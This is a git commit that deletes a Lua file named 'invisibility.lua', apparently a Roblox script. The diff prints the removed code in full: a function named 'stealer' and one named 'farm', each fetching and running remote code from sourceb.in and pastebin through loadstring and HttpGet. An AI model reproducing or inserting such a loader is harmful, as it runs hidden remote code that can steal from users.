f5311155c8f8a11fcfe91d3b4e26b473b4f45b08
Stillonthebus07 <jfloresnflores@gmail.com>
2026-06-26 03:56:25 -0400

    Delete invisibility.lua

--- invisibility.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/RD6Aqlwyvk/0'))()
-end
-local function farm()
-    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
